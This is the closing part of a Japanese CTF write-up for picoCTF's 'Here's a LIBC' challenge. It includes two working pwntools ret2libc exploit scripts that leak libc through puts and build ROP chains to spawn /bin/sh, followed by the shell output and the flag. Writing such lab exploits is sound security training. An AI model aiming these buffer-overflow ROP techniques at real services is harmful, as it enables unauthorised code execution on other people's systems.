</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="s">&#34;WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_puts</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#34;</span><span class="se">\x00\x00</span><span class="s">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_puts</span> <span class="o">-</span> <span class="n">off_puts</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">print</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s">&#34;A&#34;</span> <span class="o">*</span> <span class="n">bufsize</span>
</span></span><span class="line hl"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">b</span><span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">&#39;</span><span class="p">).</span><span class="nf">next</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="s">&#34;WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>	
</span></span></code></pre></td></tr></table>
</div>
</div>
<br />
ハイライト部分でretを入れているのは、おそらく16バイトアラインメントです。
<div class="admonition quote"><p class="admonition-title">quote</p>
<p>ret命令を一度呼び出しスタックを8バイトずらせば、system関数を呼び出しても動作します。（Kusanoさんの「例題pwnable」より）</p>
</div>
<br />
<p>書いたコード (その２)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;mercury.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">49464</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">136</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;puts: </span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">puts</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">execv</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)),</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">136</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>	
</span></span></code></pre></td></tr></table>
</div>
</div><br />
<p>動作結果：</p>
<pre>
$ ./heresalibc_solve.py
0x7fa997cbb000
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}
</pre>
<br />
<p>Flag: <code>picoCTF{1_&lt;3_sm4sh_st4cking_37b2dd6c2acb572a}</code></p>
<br />
<p><br /><br />
<br /><br /></p>
<hr>
<p><br /><br />
<br /><br /></p>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">
        2021-04-10
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
          <a href="https://captureamerica.github.io/writeups/tags/reviewed/">Reviewed</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="https://captureamerica.github.io/writeups/post/ritsec_ctf_2021/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">RITSEC CTF 2021 Writeup</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="https://captureamerica.github.io/writeups/post/angstromctf_2021/">
            <span class="next-text nav-default">ångstromCTF 2021 Writeup</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
  
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2019 - 
    2025<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  



<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-104910699-2', 'auto');
	ga('set', 'anonymizeIp', true);
	ga('send', 'pageview');
}
</script>






</body>
</html>
